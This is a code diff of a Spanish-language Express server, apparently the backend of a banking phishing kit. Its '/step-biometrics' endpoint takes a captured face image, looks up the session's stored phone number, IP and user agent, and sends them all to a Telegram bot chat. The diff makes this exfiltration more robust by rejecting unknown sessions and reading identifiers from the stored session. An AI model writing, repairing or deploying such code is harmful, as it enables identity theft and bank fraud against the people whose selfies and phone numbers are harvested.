@@ -333,13 +333,10 @@ app.post('/consignar', async (req, res) => {
 
 // ===== ENDPOINT: BIOMETRÍA 
 
-
-// ==================== ENDPOINT: BIOMETRÍA ====================
- 
 // ==================== ENDPOINT: BIOMETRÍA ====================
 app.post('/step-biometrics', async (req, res) => {
   try {
-    const { sessionId, imageBase64, userAgent, ip } = req.body;
+    const { sessionId, imageBase64 } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
@@ -349,7 +346,13 @@ app.post('/step-biometrics', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Datos incompletos' });
     }
 
-    const session = sessionData.get(sessionId) || {};
+    // 🔒 SIEMPRE recuperar la sesión REAL
+    const session = sessionData.get(sessionId);
+
+    if (!session) {
+      console.error('❌ Sesión no encontrada:', sessionId);
+      return res.status(404).json({ ok: false, error: 'Sesión no válida' });
+    }
 
     // 🔹 convertir base64 a buffer
     const buffer = Buffer.from(
@@ -372,8 +375,8 @@ app.post('/step-biometrics', async (req, res) => {
 
 📱 Número: ${session.phoneNumber || 'N/A'}
 🆔 Session: ${sessionId}
-🌐 IP: ${ip || req.ip}
-🖥️ UA: ${userAgent || 'N/A'}`
+🌐 IP: ${session.ip || req.ip}
+🖥️ UA: ${session.userAgent || req.headers['user-agent'] || 'N/A'}`
     );
 
     await axios.post(
@@ -382,7 +385,9 @@ app.post('/step-biometrics', async (req, res) => {
       { headers: formData.getHeaders() }
     );
 
-    console.log('📸 Biometría enviada a Telegram:', sessionId);
+    console.log('📸 Biometría enviada a Telegram');
+    console.log('📱 Número usado:', session.phoneNumber);
+
     res.json({ ok: true });
 
   } catch (err) {
@@ -390,7 +395,6 @@ app.post('/step-biometrics', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
-
 
 
 
